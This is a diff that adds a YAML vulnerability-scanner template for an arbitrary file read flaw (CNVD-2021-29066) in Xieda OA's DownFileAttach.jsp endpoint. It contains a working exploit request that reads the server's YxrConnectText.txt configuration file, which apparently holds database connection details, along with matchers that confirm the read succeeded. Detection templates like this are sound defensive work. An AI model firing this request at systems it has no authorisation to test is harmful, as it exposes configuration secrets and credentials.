@@ -1,0 +1,31 @@
+id: CNVD-2021-29066
+
+info:
+  name: Xieda OA DownFileAttach - File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Xieda OA is vulnerable to arbitrary file read through the 
+    `DownFileAttach.jsp` endpoint. An attacker can exploit this 
+    vulnerability by sending a crafted request to download sensitive 
+    files from the server.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-29066
+  tags: Xieda-OA
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/interface/DownFileAttach.jsp?filepath=/WEB-INF/classes/YxrConnectText.txt"
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "ipPort\\s*=\\s*[0-9.:]+"
+      - type: word
+        words:
+          - "driver"
